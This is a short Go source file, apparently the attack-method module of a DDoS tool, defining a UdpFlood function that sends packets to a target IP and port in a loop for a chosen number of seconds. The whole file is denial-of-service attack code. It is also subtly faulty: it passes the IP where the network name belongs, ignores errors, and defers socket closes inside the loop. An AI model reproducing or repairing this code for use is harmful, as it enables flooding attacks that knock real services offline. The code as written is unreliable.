package methods

import (
	"net"
	"time"
)

func UdpFlood(IP string, PORT string, SECONDS int) {

	CONTINUE := true
	FULL_ADDR, _ := net.ResolveUDPAddr(IP, PORT)
	go func() {
		for CONTINUE {
			SEND, _ := net.DialUDP("udp", nil, FULL_ADDR)
			defer SEND.Close()
			SEND.Write(make([]byte, 1472))
		}
	}()

	go func() {
		time.Sleep(time.Second * time.Duration(SECONDS))
		CONTINUE = false
	}()

}
